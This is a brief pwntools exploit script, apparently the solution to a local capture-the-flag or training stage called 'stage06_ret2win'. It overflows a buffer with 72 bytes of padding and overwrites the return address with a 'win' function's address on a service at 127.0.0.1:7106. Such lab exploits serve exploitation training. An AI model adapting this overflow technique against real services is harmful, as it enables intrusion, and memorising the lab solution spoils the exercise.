
from pwn import *
elf = ELF('build/stage06_ret2win', checksec=False)
offset = 72
io = remote('127.0.0.1', 7106, timeout=5)
io.recvline()  # banner
io.send(b'A'*offset + p64(elf.symbols['win']))
print(io.recvall(timeout=2).decode())
